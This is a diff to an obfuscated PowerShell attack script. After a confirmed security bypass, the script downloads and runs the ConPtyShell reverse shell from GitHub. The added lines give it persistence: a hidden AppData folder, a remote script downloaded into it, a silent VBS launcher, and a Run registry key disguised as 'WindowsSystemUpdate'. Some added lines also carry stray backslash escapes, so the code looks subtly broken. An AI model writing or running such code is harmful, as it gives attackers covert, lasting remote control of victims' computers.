@@ -76,6 +76,30 @@ try {
     $fi4 = $uld.$wyz($pzv)
     if ($fi4 -ne $null) {
         Write-Host '[+] Bypass confirmed'
+        
+        # Create a hidden folder in AppData
+        $hiddenFolder = "$env:APPDATA\.win_sys"
+        if (!(Test-Path $hiddenFolder)) {
+            New-Item -ItemType Directory -Path $hiddenFolder -Force
+            (Get-Item $hiddenFolder).Attributes += [System.IO.FileAttributes]::Hidden
+        }
+        
+        # Download the bypass script to the hidden folder
+        $bypassScriptPath = "$hiddenFolder\bypass.ps1"
+        (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rishieissocool/images/refs/heads/main/bypass.ps1') | Out-File -FilePath $bypassScriptPath -Encoding utf8
+        
+        # Create a VBS file to silently run the PowerShell script
+        $vbsContent = "Set objShell = CreateObject(`"WScript.Shell`")`r`nobjShell.Run `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`" & WScript.Arguments(0) & `"`"`", 0, False"
+        $vbsPath = "$hiddenFolder\run_bypass.vbs"
+        $vbsContent | Out-File -FilePath $vbsPath -Encoding ascii
+        
+        # Add to startup registry
+        $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "WindowsSystemUpdate"
+        $regValue = "wscript.exe `"$vbsPath`" `"$bypassScriptPath`""
+        Set-ItemProperty -Path \$regPath -Name \$regName -Value \$regValue
+        
+        Write-Host '[+] Persistence established'
 
         # Download and execute ConPtyShell
         IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); 
@@ -88,8 +112,8 @@ try {
 }
 
   Start-Sleep -Milliseconds 103
-  $null = [Environment]::ProcessorCount
-  $null = [System.Diagnostics.Process]::GetCurrentProcess().Id
+  \$null = [Environment]::ProcessorCount
+  \$null = [System.Diagnostics.Process]::GetCurrentProcess().Id
 }
 finally {
   Remove-Item Env:\Aqv027DF -ErrorAction SilentlyContinue
